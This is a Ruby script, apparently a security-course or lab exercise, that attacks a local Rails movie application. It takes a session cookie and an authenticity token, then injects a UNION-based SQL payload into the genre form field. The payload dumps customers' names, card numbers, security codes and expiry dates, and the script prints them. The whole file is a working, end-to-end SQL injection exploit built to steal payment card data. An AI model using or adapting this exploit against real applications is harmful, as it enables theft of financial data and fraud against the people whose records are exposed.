require 'socket'
require 'cgi'

def getSelectPage
	s = TCPSocket.open("localhost", 3000);
	post_req = "POST /movies/selectGenre HTTP/1.0" + "\r\n"
	post_req += "Content-Length: 0" + "\r\n"
	post_req += "Content-Type: application/x-www-form-urlencoded" + "\r\n"
	post_req += "Connection: close" + "\r\n"
	post_req += "Host: localhost:3000\r\n\r\n"

	s.puts(post_req)
	return s
end
 
def getCookieAndToken(socket)
	is_html_doc = false
	regexHTML = Regexp.new(/<!DOCTYPE html>.*?/)
	package = Hash.new
	while(line=socket.gets) do
		matchHTML = regexHTML.match(line)
		if matchHTML
			is_html_doc = true
		end
		if !is_html_doc
			if(line.include?("authenticity_token"))
				start = line.index("authenticity_token")
				token_str = line[start, line.length]
				value_start = token_str.index("value")
				value_str = token_str[value_start, token_str.length]
				token_start = 6
				letter = value_str[token_start + 1]
				token = ""
				i = 1
				while(letter != '"') do
					token += letter
					i += 1
					letter = value_str[token_start + i]
				end
				package["token"] = token
			elsif(line.include?("Set-Cookie:"))
				start_i = line.index("=")
				end_i = line.index(";")
				cookie = ""
				i = start_i + 1
				while(i < end_i) do
					cookie += line[i]
					i += 1
				end
				package["cookie"] = cookie
			end
		end
	end
	return package
end

def getGenrePage(cookie, token)

	attack = "' UNION SELECT c.id AS id, c.name AS title, c.card_number AS director, c.security_code AS star, c.exp_month AS release_year, c.exp_year AS genre, c.billing_street AS rating FROM customers c where 1=1 or c.name ='"

	s = TCPSocket.open("localhost", 3000);
	post_req = "POST /movies/showGenre HTTP/1.0" + "\r\n"
	post_req += "Cookie: _session_id=" + cookie + "\r\n"
	content_string = "authenticity_token=" + CGI.escape(token) +"&genre=" + attack
	post_req += "Content-Length: " + content_string.length.to_s + "\r\n"
	post_req += "Content-Type: application/x-www-form-urlencoded" + "\r\n"
	post_req += "Connection: close" + "\r\n"
	post_req += "Host: localhost:3000\r\n\r\n"
	post_req += content_string
	
	s.puts(post_req)
	return s
end

def print_info(socket)
	while(line = socket.gets) do
		if(line.include?("<td><a href="))
			new_str = line[26, line.length]
			name_index = new_str.index(">") + 1
			last_index = new_str.index("<")
			name = ""
			while(name_index < last_index) do
				name += new_str[name_index]
				name_index += 1
			end
			puts("Name: " + name)
			
			line = socket.gets
			new_str = line[line.index("<"), line.length]
			card_number = new_str[4, 16]
			puts("Card Number: " + card_number)
			
			line = socket.gets
			new_str = line[line.index("<"), line.length]
			security_code = new_str[4, 3]
			puts("Security Code: " + security_code)
			
			line = socket.gets
			new_str = line[line.index("<") + 1, line.length]
			expr_month = new_str[3, new_str.index("<") - 3]
			puts("Expiration Month: " + expr_month)
			
			line = socket.gets
			new_str = line[line.index("<"), line.length]
			expr_year = new_str[4, 4]
			puts("Expiration Year: " + expr_year)
			
			puts("\n")
		end
	end
end

socket = getSelectPage()
package = getCookieAndToken(socket)
socket2 = getGenrePage(package["cookie"], package["token"])
print_info(socket2);